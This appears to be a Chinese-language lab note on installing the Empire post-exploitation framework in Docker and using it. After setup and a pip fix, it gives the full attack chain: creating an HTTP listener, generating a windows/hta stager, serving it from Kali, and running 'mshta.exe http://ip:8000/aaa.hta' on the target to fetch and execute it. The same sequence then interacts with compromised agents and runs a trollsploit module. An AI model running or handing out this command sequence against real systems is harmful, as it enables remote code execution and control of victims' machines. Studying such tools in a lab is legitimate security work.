创建Empire docker容器

以下操作都处于root权限
启动docker：
systemctl start docker

获取docker里empire的环境镜像：
docker pull empireproject/empire

创建docker容器并命名为empire：
docker create -it -p 7000:7000 --name empire empireproject/empire /bin/bash     **-p 进行pat
搜索docker提供的镜像：
docker search empire（可访问互联网的环境下运行）
//运行 Empire 容器：
//docker run -it bcsecurity/empire
列出已获取镜像：
docker image ls

列出已有容器：
docker ps -a

Empire初始化
//sudo不能忽略
运行empire容器：docker start -i empire
初始化empire：sudo ./setup/reset.sh
输入密码
启动empire：sudo ./empire
提示缺少pefile模块
升级pip再安装pefile 
`wget https://bootstrap.pypa.io/pip/2.7/get-pip.py`
`python get-pip.py`
`ln -s /usr/local/bin/pip2.7 /usr/bin/pip`
`pip install pefile`

`docker network inspect bridge`

清理环境
使用 Docker 时，如果不再需要 Empire，可以清理容器：
docker stop <container_id>
docker rm <container_id>


listeners
uselistener http
set Name http_proxy
set Host http://ip:7000
set Port 7000
execute

usestager windows/hta
set Listener http_proxy
execute

kali:python3 -m http.server

mshta.exe http://ip:8000/aaa.hta

agents
interact xxx
help

usemodule  trollsploit/message
set MsgText "Bye bye"
execute
